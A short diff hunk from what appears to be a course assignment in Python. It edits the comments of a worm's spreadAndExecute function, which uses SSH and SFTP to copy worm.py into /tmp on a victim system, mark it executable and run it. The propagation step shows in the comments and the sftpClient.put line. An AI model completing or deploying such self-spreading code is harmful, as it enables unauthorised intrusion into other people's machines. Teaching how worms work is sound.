@@ -158,10 +158,8 @@ def spreadAndExecute( sshClient, sftpClient ):
 	# to the victim system. The worm will
 	# copy itself to remote system, change
 	# its permissions to executable, and
-	# execute itself. Please check out the
-	# code we used for an in-class exercise.
-	# The code which goes into this function
-	# is very similar to that code.
+	# execute itself.
+	
 	try:
 		sftpClient.put( find_file( "worm.py" ), "/tmp/" + "worm.py" )
 
